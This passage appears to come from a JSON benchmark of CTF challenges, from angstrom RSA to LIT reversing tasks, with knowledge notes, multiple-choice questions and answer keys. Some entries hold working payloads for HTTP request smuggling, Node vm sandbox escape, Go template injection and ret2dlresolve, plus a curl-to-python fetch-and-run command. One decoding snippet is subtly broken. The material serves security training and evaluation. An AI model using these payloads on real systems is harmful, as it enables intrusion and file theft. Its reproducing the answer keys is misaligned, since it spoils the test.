            "When given portions of the factors of an RSA key (such as the top half of \\(p\\) and the bottom half of \\(q\\)), these halves can be combined with the modulus \\(n\\) to recover the full factors. This involves calculating the inverse modulus of the known half of \\(q\\) against \\(2^{512}\\), multiplying it by the modulus \\(n\\), and then applying the modulus of \\(2^{512}\\) to find the missing half of \\(p\\). Finally, combine the known half with the newly found half to recover the full factor. This method allows the reconstruction of \\(p\\) and \\(q\\) even when only portions of them are known, enabling the decryption of the ciphertext:\n\nExample code snippet to recover low bits of \\(p\\):\n```python\nfrom Crypto.Util.number import inverse\n# Given values: n, q_low\np_low = n * inverse(q_low, 2**512) % 2**512\n```",
            "An alternative method for recovering RSA factors when partial information is available involves calculating the high bits of one factor using the high bits of the other. After dividing the modulus \\(n\\) by the shifted high bits of \\(p\\), the result is then shifted to isolate the high bits of \\(q\\), which, when combined with the known lower bits of \\(q\\), fully recovers \\(q\\). This method might need adjustments for the missing lower bits' influence, but provides a means to deduce the factor without direct knowledge of its lower half. This approach demonstrates flexibility in factor recovery strategies for RSA encryption, which can be crucial when direct methods are not applicable.\n\nExample code to calculate high bits of \\(q\\) and recover \\(q\\):\n```python\n# Adjusted from given values: n, p_high, q_low\nq_high = n // (p_high << 512) >> 512\nq = q_high << 512 | q_low\n```"
        ],
        "question": [
            "In the process of recovering RSA encryption keys, if the top 512 bits of \\(p\\) and the bottom 512 bits of \\(q\\) are known, and given the modulus \\(n\\), an essential step to find the missing half of \\(p\\) involves the calculation of the inverse modulus. Which of the following Python code snippets correctly demonstrates how to recover the lower 512 bits of \\(p\\) using the inverse modulus operation? - A. `p_low = inverse(p_high, 2**512) * n % 2**512` - B. `p_low = (n // q_low) % 2**512` - C. `p_low = n * inverse(q_low, 2**512) % 2**512` - D. `p_low = n // (inverse(q_low, 2**512) % 2**512)` ",
            "Considering a scenario in RSA encryption where you need to recover the high bits of \\(q\\), given the modulus \\(n\\), the high bits of \\(p\\) (p_high), and the low bits of \\(q\\) (q_low). Which Python code snippet accurately calculates the high bits of \\(q\\) and combines them with the known low bits to recover the full factor \\(q\\)? - A. `q = (n % (p_high << 512)) >> 512 | q_low` - B. `q_high = n // (p_high << 512); q = q_high | q_low` - C. `q_high = n //(p_high<<512) >> 512; q = q_high << 512 | q_low` - D. `q = (n // inverse(p_high << 512)) | q_low` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Relatively Simple Algorithm",
        "write_up": "dataset/raw/Relatively Simple Algorithm.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 40,
        "max_score": 300,
        "difficulty": 0.13333333333333333,
        "knowledge": [
            "In RSA encryption challenges, calculating the decryption exponent `d` is critical for decrypting the ciphertext. This can be accomplished when the prime factors of the modulus `n` (i.e., `p` and `q`) are known, using the formula `d = pow(e, -1, (p-1)*(q-1))`. This is applicable in scenarios where the RSA modulus `n` can be factored into its prime constituents `p` and `q`.",
            "Once the decryption exponent `d` is known, the plaintext message `m` can be recovered from the ciphertext `c` using the formula `m = pow(c, d, n)`. This decryption process involves modular exponentiation and is utilizable in scenarios where the RSA parameters (`c`, `d`, and `n`) are known. The plaintext, typically represented in hexadecimal format, can be converted back to a readable string (if it represents ASCII values).\n   \nExample payload for decryption and conversion to string:\n```python\nd = pow(e, -1, (p-1)*(q-1))\nplaintext_hex = hex(pow(c, d, n)).rstrip(\"L\")\nflag = bytearray.fromhex(plaintext_hex[2:]).decode()\nprint(flag)\n```"
        ],
        "question": [
            "In the context of RSA encryption, when you are given the prime factors of the RSA modulus `n` as `p` and `q`, how would you correctly calculate the decryption exponent `d`, if the public exponent `e` is known to be 65537? - A. d = pow(e, 65537, (p+1)*(q+1)) - B. d = pow(e, -1, (p-1)*(q-1)) - C. d = e * (p-1) * (q-1) - D. d = 1 / (e * (p+1) * (q+1))",
            "Given the RSA encryption parameters (`c`, `d`, and `n`), and knowing that `c` represents the ciphertext, `d` the decryption exponent, and `n` the RSA modulus, which Python code correctly decrypts the ciphertext and converts it to a readable string assuming that the plaintext represents ASCII values? - A. flag = ((c ** d) % n).to_bytes((n.bit_length() + 7) // 8, 'big').decode() - B. flag = bytearray.fromhex(hex((c ** d) // n)).decode() - C. plaintext_hex = hex(pow(c, d, n)) flag = bytearray.fromhex(plaintext_hex[2:]).decode() - D. flag = c.to_bytes(len(c), 'big').decode()"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Release the (g)Unicorn",
        "write_up": "dataset/raw/Release the (g)Unicorn.md",
        "type": "web",
        "competition": [
            "UACWS/2022",
            "https://ctftime.org/event/1674/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When investigating web applications, examining the source code for hidden endpoints can uncover improperly secured paths that might allow unauthorized access to sensitive data or functionalities. In scenarios where direct access to certain endpoints is restricted (like a 403 Forbidden error when attempting to access the /flag endpoint), scrutinizing the web server or application server's version for known vulnerabilities can be key. This approach is particularly effective if the server software is outdated or poorly configured.",
            "HTTP request smuggling can be utilized to bypass security restrictions enforced by intermediate devices (like proxies or web application firewalls) within a web application architecture. This technique is applicable when the application is served by vulnerable server software that misinterprets the sequence of HTTP requests. Crafting a malicious payload that takes advantage of these vulnerabilities (such as the one found in gunicorn 20.0.4) can allow attackers to smuggle unauthorized requests to access restricted endpoints. A sample payload for exploiting HTTP request smuggling in scenarios where gunicorn is vulnerable:\n\n    ```bash\n    GET /admin HTTP/1.1  \n    Host: cybersecweek.ua.pt:2005  \n    Content-Length: 78  \n    Sec-Websocket-Key1: x\n\n    xxxxxxxxGET /flag HTTP/1.1  \n    Host: cybersecweek.ua.pt:2005  \n    Content-Length: 48\n\n    GET / HTTP/1.1  \n    Host: cybersecweek.ua.pt:2005\n    ```"
        ],
        "question": [
            "When investigating a web application, why is it crucial to examine the source code for hidden endpoints and the version of server software being used? - A. To find decorative elements for the website - B. To ensure that the application uses the latest version of Python - C. To uncover potentially unsecured paths and check for known vulnerabilities in server software, which could allow unauthorized access - D. To improve the website's search engine optimization (SEO)",
            "In the context of bypassing security restrictions using HTTP request smuggling, why is crafting a malicious payload targeting vulnerabilities in server software (e.g., gunicorn) effective? - A. Because it allows the seamless integration of third-party analytics - B. Because it helps in optimizing server performance under heavy load - C. Because it enables unauthorized access to restricted endpoints by exploiting misinterpretations in the handling of HTTP request sequences - D. Because it provides a method for enhanced encryption of web traffic"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Reptilian Server",
        "write_up": "dataset/raw/Reptilian Server.md",
        "type": "The type of this CTF challenge is ***pwn*** (short for \"exploit\") since the objective is to exploit a vulnerability in the server's code to run unauthorized commands and gain access to sensitive information, such as the flag.",
        "competition": [
            "SwampCTF/2024",
            "https://ctftime.org/event/2138/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering sandbox environments in challenges, such as those implemented using nodejs' `vm` package, it is possible to escape the sandbox by leveraging the parent constructor's methods despite the sandbox's intended restrictions. This bypass is feasible because the `vm` module does not effectively isolate the sandboxed code from accessing the parent constructors, allowing the execution of arbitrary code within the host environment. A suitable approach to escape the sandbox involves using `this.constructor.constructor(\"return [code]\")()` to execute the arbitrary code. \n   Example payload: `this.constructor.constructor(\"return process.env\")()`",
            "In challenges where input is validated for specific constraints, such as the absence of spaces or a maximum character length, alternative encoding methods or characters recognized by the language parser but not by the validation logic can be used to circumvent these restrictions. For Node.js applications, using Unicode characters like `0xa0` (non-breaking space) instead of regular spaces allows bypassing space restrictions. Additionally, breaking down the payload into smaller chunks can help overcome character length limitations without altering the intended functionality of the exploit.\n   Example payload: \n   ```\n   c=this.constructor.constructor\n   x=\"return\\xa0process.env\"\n   console.log(c(x)())\n   ```"
        ],
        "question": [
            "When trying to escape a sandbox environment implemented using Node.js' `vm` package, which method allows for the execution of arbitrary code outside the intended sandboxed scope? - A. `process.exit()` - B. `global.eval()` - C. `this.constructor.constructor(\"return [code]\")()` - D. `setTimeout(\"[code]\",0)`",
            "Given a Node.js application that validates input to disallow spaces and restricts input length, which technique can be utilized to bypass the space restriction in a command injection vulnerability? - A. Use the `\\t` (horizontal tab) character instead of spaces. - B. Use the `0xa0` (non-breaking space) Unicode character instead of regular spaces. - C. Replace spaces with the HTML entity `&nbsp;`. - D. Use the `+` (plus) symbol to concatenate strings without spaces."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Request Bin",
        "write_up": "dataset/raw/Request Bin.md",
        "type": "pwn",
        "competition": [
            "WeCTF/2022",
            "https://ctftime.org/event/1546/tasks/"
        ],
        "score": 1610,
        "max_score": 2815,
        "difficulty": 0.5719360568383659,
        "knowledge": [
            "In challenges involving Golang templating engines, a Server-Side Template Injection (SSTI) vulnerability can be exploited if public functions of a struct passed to the templating system are callable. The exploitability of a function depends on its signature; it must return either one value or one value along with an error to be considered viable for invocation in an SSTI context. Functions returning more than this are not exploitable in this scenario.",
            "Identification and exploitation of an SSTI vulnerability in a Golang templating scenario can be achieved through error messages by attempting to access a non-existent property within the template. This method helps to reveal the struct type being passed to the templating engine, which can then be investigated for exploitable functions. In the described scenario, exploiting the `.Ctx` variable's `SendFile` function allows for arbitrary file read, provided the function's requirements are met (i.e., the correct number and types of arguments are supplied).\n   - Example payload to exploit the SSTI for arbitrary file read: `{{ .Ctx.SendFile \"/flag\" \"flag.txt\"}}`"
        ],
        "question": [
            "In a Go web application using the templating system, considering a struct is passed to the template that includes a public function with one of the following signatures, which is NOT viable for invoking due to the constraints of Server-Side Template Injection (SSTI) in Golang? - A. `func (s *StructName) FunctionName() (string, error)` - B. `func (s *StructName) FunctionName() string` - C. `func (s *StructName) FunctionName() int` - D. `func (s *StructName) FunctionName() (int, int, error)`",
            "In the process of exploiting a Server-Side Template Injection (SSTI) vulnerability within a Golang application, an attacker identifies the struct passed to the template by triggering an error with a nonexistent property. This identifies the struct `accesslog.Log`. The attacker targets the `.Ctx` variable for exploitation. Based on this information, what is the correct Golang template payload to exploit the SSTI for an arbitrary file read using the `SendFile` method? - A. `{{ .Ctx.SendFile \"/flag\", \"result.txt\"}}` - B. `{{ .Ctx.SendFile(\"/invalid/path\", \"/etc/passwd\") }}` - C. `{{ .NonExistentMethod \"/flag\", \"result.txt\" }}` - D. `{{ .Ctx.SendFile \"/flag\" \"result.txt\"}}`"
        ],
        "answer": [
            "D.",
            "D."
        ]
    },
    {
        "name": "required",
        "write_up": "dataset/raw/required.md",
        "type": "crypto",
        "competition": [
            "DigitalOverdose/2021",
            "https://ctftime.org/event/1459/tasks/"
        ],
        "score": -1.0,
        "max_score": 600,
        "difficulty": -1,
        "knowledge": [
            "In reversing challenges involving encrypted flag computations within a codebase comprising multiple files with operations such as addition, subtraction, bitwise operations, and shifts, examining each file to understand the sequence and type of operations performed can be effective. Many times, these operations are invertible, and reversing their order while inverting each operation can reveal the original data or flag. \n   \n   - For operations that inherently have inverse operations (like addition/subtraction, XOR, or rotations), writing a script that performs these inverse operations in the reverse sequence can decrypt the data.\n   - Example for a single byte operation inversion: If `f[0] ^= 0x1F`, the inversion would be `f[0] ^= 0x1F` again as XOR is its own inverse.",
            "When automating the analysis of complex code execution flows, especially in scenarios with heavy use of dynamic imports (like `require` in Node.js) and operations that mutate state, instrumenting the code to log or output the execution path and state changes can provide insight into the data manipulation process. This can be particularly useful in environments where debugging might otherwise be challenging due to the dynamic nature of the execution.\n\n   - An implementation strategy involves appending logging instructions to each file or each relevant operation. This can highlight the series of transformations applied to data.\n   - Example for operator logging: Adding `console.log(`Operation: f[${i}] ^= 0x1F`)` to output the operation being performed."
        ],
        "question": [
            "In a reversing challenge that involves decrypting a flag by reversing a sequence of operations like addition, subtraction, and bitwise operations, which of the following steps is crucial for reversing the computations correctly?  - A. Only execute the operations in the same sequence as originally performed, focusing on addition and subtraction. - B. Reverse the order of operations and apply the direct inverse of each operation, such as using addition instead of subtraction. - C. Execute all bitwise operations first before handling any arithmetic operations to ensure correct order of execution. - D. Reverse the order of operations while applying the exact inverse operation for each, such as negating an addition with subtraction, and understanding that XOR is its own inverse. ",
            "When dealing with a challenge that involves analyzing a large codebase with dynamic imports and state mutations across multiple files, what is one effective way to trace the operations applied to sensitive data like a cryptographic key or a flag?  - A. Manually review each file without any additional logging, assuming the static code will be indicative of the dynamic execution flow. - B. Append logging instructions to the entry points of the application, minimally interfering with the execution flow to get a broad overview. - C. Instrument the code by adding specific logging statements before and after critical operations or dynamic imports to capture the sequence of transformations and state changes in detail. - D. Focus exclusively on external module imports to understand the flow, ignoring internal state changes as they tend to remain constant throughout the execution. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Resolve",
        "write_up": "dataset/raw/Resolve.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 980,
        "max_score": 1000,
        "difficulty": 0.98,
        "knowledge": [
            "In challenges without Position Independent Executable (PIE) and stack canary protections, ret2dlresolve technique can be used to execute arbitrary code by leveraging dynamic linking and loading mechanisms. This technique is particularly useful when direct references to system functions are not available in the binary. Utilize tools like pwntools to create a payload that resolves the address of required functions (e.g., system) at runtime. Example payload snippet:\n```python\nd = pwn.Ret2dlresolvePayload(e, symbol=\"system\", args=[\"sh\"])\nr.ret2dlresolve(d)\npayload = pwn.fit({0x10: r.chain()}) + b\"\\n\" + d.payload\n```",
            "When creating an exploit for binaries with an overflow vulnerability, as demonstrated by use of `gets` function which does not limit input length, it's effective to align the stack before redirecting execution flow. This can be achieved by using a ret gadget (a gadget that simply consists of a ret instruction) before executing the rest of the payload. This is crucial in scenarios where the binary has protections like NX enabled, requiring precise control over the stack to execute a ret2dlresolve or similar attack. Example snippet for stack alignment:\n```python\nr.raw(0x401159)  # ret gadget to align stack\n```"
        ],
        "question": [
            "In a scenario where an application does not implement Position Independent Executable (PIE) and stack canary protections, which technique would be most effective for executing arbitrary code by leveraging the dynamic linker/loader to resolve symbols at runtime? - A. ret2libc - B. Buffer overflow without any additional techniques - C. ret2dlresolve - D. Use of uninitialized variables",
            "When exploiting a binary with an overflow vulnerability due to the use of `gets`, which does not limit input length, why is it necessary to align the stack before redirecting the execution flow in the presence of Non-Executable (NX) stack protection? - A. To prevent segmentation faults due to misaligned access - B. To bypass the NX protection by aligning executable code on the stack - C. To ensure the shellcode is executed correctly - D. To ensure precision in the control over the stack for executing techniques like ret2dlresolve"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Return of the Intro to Netcat",
        "write_up": "dataset/raw/Return of the Intro to Netcat.md",
        "type": "misc",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 160,
        "max_score": 493,
        "difficulty": 0.32454361054766734,
        "knowledge": [
            "When encountering challenges requiring a proof-of-work (PoW) solution before access is granted, utilize external solver scripts provided by the challenge, typically accessible via a URL. These scripts often automate the process of solving the PoW challenge, thus allowing for quicker access to the actual challenge component. After obtaining the solution from the script, it must be submitted back to the server to proceed. Example command: `python3 <(curl -sSL [solver URL]) solve [PoW token]`.",
            "Utilize netcat (nc) to interact with remote servers as specified in challenge instructions. This tool is essential for communicating with the challenge server, sending inputs (such as PoW solutions), and receiving outputs (such as flags). Always ensure to first solve any prerequisite steps (e.g., PoW) before expecting the actual content or flag to be served by the remote challenge. Example usage: `nc [domain] [port]`, followed by submitting any required solutions obtained from earlier steps."
        ],
        "question": [
            "In a CTF challenge that integrates a proof-of-work mechanism to throttle automated scripts, you may be directed to use an external solver script to obtain a token. Which of the following commands correctly represents the usage of curl and python to fetch and execute such a solver script?  - A. `python3 <(wget -qO- [solver URL]) solve [PoW token]` - B. `python3 <(curl -sSL [solver URL]) solve [PoW token]` - C. `python [solver URL] solve < [PoW token]` - D. `curl -sSL [solver URL] | python3 solve [PoW token]` ",
            "When tasked with accessing a flag from a server in a cybersecurity challenge, which command best demonstrates using netcat (nc) to connect to a specified domain and port, following the guidelines for such challenges?  - A. `nc -lv [domain] [port]` - B. `telnet [domain] [port]` - C. `nc [domain] [port]` - D. `ssh [domain] -p [port]` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Return Of The ROPs",
        "write_up": "dataset/raw/Return Of The ROPs.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 480,
        "max_score": 1000,
        "difficulty": 0.48,
        "knowledge": [
            "For challenges that incorporate a Proof-of-Work (PoW) system as an initial step, Python's `itertools`, `hashlib`, and `string` libraries can be used to generate permutations of potential inputs and hash them until the output matches a given hash. This approach is useful in bypassing PoW protections in binary exploitation challenges. Example code snippet for passing PoW:\n```python\nimport itertools, hashlib, string\nprefix = \"given_prefix\" # The prefix provided in the challenge\ntarget_hash = \"target_md5_hash\" # The MD5 hash to match\nfor attempt in itertools.product(string.ascii_lowercase, repeat=4):\n    test_string = prefix + ''.join(attempt)\n    if hashlib.md5(test_string.encode()).hexdigest() == target_hash:\n        print(\"Found matching string:\", test_string)\n        break\n```",
            "In binary exploitation challenges where buffer overflow vulnerabilities are identified, specifically with the presence of functions like `gets`, it's possible to leverage Return-Oriented Programming (ROP) to execute arbitrary code despite NX protections. One effective approach involves leaking libc addresses to bypass ASLR and then using ROP gadgets to call `system(\"/bin/sh\")` to spawn a shell. This strategy is applicable when direct execution control via buffer overflow is hindered by security mechanisms like NX."
        ],
        "question": [
            "In a scenario where you are facing a Proof-of-Work (PoW) challenge that requires finding a four-letter string matching a given MD5 hash, and you are considering Python libraries to accomplish this task efficiently, which combination of libraries would best facilitate generating permutations of string inputs and hashing them until the MD5 hash matches the target? - A. `math`, `sha256`, and `intertools` - B. `itertools`, `hashlib`, and `string` - C. `random`, `md5`, and `permutations` - D. `hashlib`, `permutations`, and `ascii_letters`",
            "When exploiting a binary file with a buffer overflow (bof) vulnerability due to improper input validation by the `gets` function, and aiming to perform a Return-Oriented Programming (ROP) attack under NX protection, what is an essential first step in this process? - A. Increasing the stack size to allow for more ROP gadgets - B. Leaking the address of `libc` to bypass ASLR and correctly align ROP gadgets - C. Replacing `gets` with a safer function call to prevent binary crash - D. Disabling NX on the target system to permit execution of arbitrary code"
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Rev 0",
        "write_up": "dataset/raw/Rev 0.md",
        "type": "reverse",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 728,
        "max_score": 1000,
        "difficulty": 0.728,
        "knowledge": [
            "In reverse engineering challenges dealing with encoded inputs or where input is processed into an obscure format, constructing a lookup table by mapping encoded representations to their corresponding original characters can significantly simplify the decoding process. This approach is especially useful when the encoding logic for each character is isolated and does not depend on other characters. This allows for the reverse engineering of encoded data without fully understanding or reversing the encoding logic.\n   - Example implementation snippet:\n     ```python\n     def encode_array(input_char):  \n         list2 = [1, 1]  \n         for i in range(8):  \n             two = list2[0] + list2[1]  \n             list2[(ord(input_char) >> (i & 0x1f) & 1 ^ 1)] = two  \n         return list2\n\n     reference = {tuple(encode_array(char)): char for char in string.printable}\n     ```",
            "When dealing with encoded numbers that represent a sequence of processed characters in reverse engineering challenges, applying mathematical operations such as modulo with specific constants can help in deducing the original numbers or sequences. This strategy is effective when the encoding stage transforms characters into numbers using operations that have inverse operations, such as multiplication and addition in a reversible manner.\n   - For instance, if the encoding process involves incremental transformations with multiplication and addition, one can reverse this process with the modulo operation and divisions by the same constants used in the encoding, thereby allowing the recovery of the original sequence from the final numeric representation.\n   - Example implementation snippet:\n     ```python\n     def decode_single_pair(number):  \n         y = number % 0x551  \n         number = (number - x) / 0x551  \n         x = number % 0x551  \n         number = (number - y) / 0x551  \n         return y, x, number\n\n     def decode(number):  \n         rest = number  \n         results = []  \n         while rest != 0:  \n             a, b, rest = decode_single_pair(rest)  \n             results.append([a, b])  \n         return results[::-1]  \n     ```"
        ],
        "question": [
            "In a reverse engineering scenario, an encoded input undergoes a transformation where each character is processed into a pair of numbers using a specific algorithm. The transformation logic for each character operates in isolation, enabling the possibility of creating a lookup table to facilitate decoding. Given the following pseudo-code to encode a character into a numerical pair, how can you decode a sequence of such encoded numbers back to the original string?  ```python def encode_char(input_char): list2 = [1, 1] for i in range(8): list2[(ord(input_char) >> (i & 0x1f) & 1 ^ 1)] = list2[0] + list2[1] return list2 ``` - A. Reverse the order of operations and directly calculate the ASCII value of each character. - B. Iterate over all possible character values to find which character corresponds to the encoded numerical pair. - C. Decode each pair individually without considering their sequence. - D. Construct a lookup table by pre-calculating encoded pairs for all printable characters and use it to map encoded pairs back to characters. ",
            "In the process of reverse-engineering an obfuscated code, you encounter a sequence of numbers that were encoded through a series of operations involving multiplication and addition with specific constants from a sequence of character-based data. The final number can be seen as an aggregated result of processing each character. If the original encoding process can be described by the pseudo-code below, which method would effectively allow you to reverse the sequence and deduce the original data?  ```python def encode_data(data): x = 0 for char in data: list2 = [some_process(char)]  # Assume some_process(char) transforms char into a list of two integers x = x * CONSTANT + list2[0] x = x * CONSTANT + list2[1] return x ``` - A. Perform a direct inverse of the multiplication and subtraction operations in the reverse order they were applied. - B. Split the final number into its prime factors and map them back to characters. - C. Use the modulo operation with the encoding constant and division to reverse the encoding process step by step, retrieving the original list2 values. - D. Convert the final number into a binary string and directly infer the original characters from binary patterns. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Rev 1",
        "write_up": "dataset/raw/Rev 1.md",
        "type": "reverse",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 797,
        "max_score": 1000,
        "difficulty": 0.797,
        "knowledge": [
            "When analyzing a binary that appears to be highly obfuscated, particularly one utilizing techniques like movfuscation, which turns the code into a series of MOV instructions, it is recommended to use specialized deobfuscation tools such as Demovfuscator. This tool can help simplify the binary analysis by either recovering the binary to a less obfuscated form or generating a flowchart representing the binary's logic.",
            "For binaries where conventional analysis methods are inefficient or impractical due to the complexity or obfuscation level (e.g., movfuscated binaries), leveraging performance analysis tools like `perf` can identify the correct input based on the number of instructions executed. This method involves running the binary with different inputs and observing the instruction count changes, potentially revealing how the inputs are processed. An automated script can streamline this process by systematically testing different inputs and comparing the instruction counts to determine the correct sequence towards revealing the flag.\n    - Example bash script snippet for bruteforcing using perf tool:\n    ```bash\n    readarray -t PRINTABLES < <( echo '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&()+,-./:;<=>?@[\\]^_`\\{|\\}~' |  fold -w1 )\n    FLAG=''\n    while [ \"${FLAG: -1}\" != '}' ]; do\n        FLAG=$FLAG$(\n            for C in ${PRINTABLES[@]} ; do\n                INSTRUCTIONS=$(echo \"$FLAG$C\" | perf stat -x: -e instructions:u ./binary 2>&1| grep instruction | cut -d: -f1)\n                echo \"$INSTRUCTIONS:$C\"\n            done | sort -n | head -n1 | cut -d: -f2   \n        )\n        echo $FLAG\n    done\n    ```\n    This script iterates through possible characters, appending them to the flag string and utilizing the performance counter to determine which character yields a change indicative of correct input."
        ],
        "question": [
            "In the context of analyzing heavily obfuscated binaries, particularly those that have been transformed into sequences comprised solely of MOV instructions (a technique known as movfuscation), which of the following tools is specifically designed to aid in deobfuscating or understanding the binary's logic by recovering it to a more straightforward form or by generating a flowchart? - A. Ghidra - B. Radare2 - C. Demovfuscator - D. Binary Ninja",
            "When faced with a binary that is too complex or obfuscated to analyze through conventional means, such as a binary obfuscated to contain only MOV instructions, which method allows for determining the correct input by observing changes in the number of executed instructions? - A. Using static analysis to manually decompile the binary - B. Employing dynamic analysis tools to automatically generate code annotations - C. Leveraging a debugger to step through each instruction and monitor changes - D. Utilizing a performance analysis tool like `perf` with a script to test different inputs and compare instruction counts"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Reverse a cellular automata",
        "write_up": "dataset/raw/Reverse a cellular automata.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 80,
        "max_score": 500,
        "difficulty": 0.16,
        "knowledge": [
            "When dealing with cellular automata, especially Rule 126, understanding the pattern generation rules is crucial. For Rule 126:\n   - A bit value of '0' is generated by the patterns '000' and '111', whereas a bit value of '1' is generated by all other 3-bit patterns.\n   - The selection of a pattern imposes constraints on subsequent patterns due to the overlap requirement. For instance, if the current pattern is '000', then the subsequent pattern can only be '000' or '001'.",
            "To reverse the cellular automata process effectively, a script that iterates over all valid pattern combinations based on the rules of bit generation and pattern sequencing is needed. The process involves:\n   - Mapping each bit to its potential generating patterns.\n   - Ensuring that each selected pattern is valid by checking it against allowable subsequent patterns based on the last two bits of overlap.\n   - Recursively generating all possible previous steps and checking each against the desired outcome using predefined rules of transformation and overlap. This method drastically reduces the complexity and computation time compared to brute-force approaches."
        ],
        "question": [
            "In the context of Rule 126 cellular automata, when trying to determine which patterns generate a bit value of '0', which of the following sets of patterns correctly represents the rule? - A. {001, 010, 011, 100, 101, 110} - B. {000, 111} - C. {000, 001, 010, 100, 101} - D. {111, 110, 101, 100} ",
            "While writing a script to reverse a Rule 126 cellular automata process, how should the script determine the valid subsequent patterns for a current pattern '010' to ensure correctness in reversing the process? - A. By allowing any pattern as a valid subsequent pattern. - B. By limiting subsequent patterns to ones that share no bits in common with '010'. - C. By allowing only patterns '100' and '101' as they overlap by the last two bits ('10') with the current pattern '010'. - D. By randomly selecting subsequent patterns to generate diversity in solutions. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "REVMEPLX",
        "write_up": "dataset/raw/REVMEPLX.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 100,
        "max_score": 960,
        "difficulty": 0.10416666666666667,
        "knowledge": [
            "When analyzing executables for reverse engineering challenges, running `strings` command can reveal hints, hardcoded strings or even parts of a flag directly from the binary. This approach can expose important information without needing to delve deeper into the code or logic of the program. For instance, the `strings` command in the challenge revealed names and parts of the flag, guiding further analysis and interaction with the program.",
            "In scenarios involving calculations or checks against user input, examining the mathematical operations in the source code or decompiled output can reveal how to craft specific inputs to satisfy conditions. If a function performs operations like shifting (right or left) which effectively multiplies or divides the input by powers of two, reversing the operation can help derive the original or required input. For example, if a check involves right-shifting an input by 8 bits and comparing it to a known value, reversing this by left-shifting the known value by 8 bits and then multiplying or dividing appropriately can help deduce the correct input to pass the check. Sample input derived from reversing the operation: `171136.0`."
        ],
        "question": [
            "When faced with a reverse engineering challenge, which command can be particularly useful for extracting strings from the binary to uncover potential hints or hardcoded data without in-depth analysis?  - A. `grep` - B. `strings` - C. `ltrace` - D. `objdump` ",
            "In a reverse engineering challenge, given a code snippet from a decompiled executable where an input parameter is manipulated through bitwise operations as follows: `if (param_1 * 2 >> 8 == 0x539)`, which mathematical operation can be performed to reverse this condition and discover the expected input value?  - A. Multiply `0x539` by 2 and then add 8. - B. Right-shift `0x539` by 2 and then multiply by 8. - C. Left-shift `0x539` by 8 bits and then divide by 2. - D. Divide `0x539` by 2 and then left-shift by 8 bits. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "rev_Evaluation",
        "write_up": "dataset/raw/rev_Evaluation.md",
        "type": "reverse",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving obfuscated Python code, the use of nested `eval()` functions may be designed to make the code harder to read. Simplifying the expression by systematically removing layers of `eval()` can help in understanding the underlying logic of the code.",
            "When encountering character manipulation through operations like XOR (`^`) and reversal (`[::-1]`), it indicates the process to either obfuscate or deobfuscate a string. To reverse such operations, apply the same operations in the reverse order on the given string to retrieve the original or intended message.  \n**Example Payload:** `''.join([chr(ord(x)^5) for x in 'x6wpf6vZ|w6sZq5kZv4Zk54q1fvpcg5~bdic'])[::-1]`"
        ],
        "question": [
            "In a Python challenge, the obfuscated code provided uses multiple `eval()` functions nested within each other. To simplify and understand the logic of the code for analysis, what should be your first approach? - A. Systematically remove layers of `eval()` one at a time and examine the output. - B. Replace `eval()` functions with `exec()` to execute the code directly. - C. Increase the number of `eval()` layers to enhance code readability. - D. Convert all `eval()` functions to string format and print them.",
            "Given a Python expression intended for string deobfuscation `''.join([chr(ord(x)^5) for x in 'x6wpf6vZ|w6sZq5kZv4Zk54q1fvpcg5~bdic'])[::-1]`, what is the sequence of operations applied to obfuscate the original message? - A. Each character\u2019s Unicode code point is XORed with 5, and the resulting string is reversed. - B. The original string is reversed first and then each character is replaced with its ASCII value incremented by 5. - C. The string is encrypted by hashing each character with SHA-256 before reversing the order. - D. Characters are first concatenated with a separator before undergoing a bitwise AND operation."
        ],
        "answer": [
            "A.",
            "A."
        ]
    },
    {
        "name": "rev_Loading",
        "write_up": "dataset/raw/rev_Loading.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing binary programs for vulnerabilities or hidden functionalities, loops that perform a large number of iterations can often be simplified for analysis. If the loop is primarily responsible for modifying data in a predictable and repetitive manner, calculate the total number of iterations needed to complete all data transformations. This approach is particularly useful when the loop modifies data based on the iteration count in a cyclic pattern.",
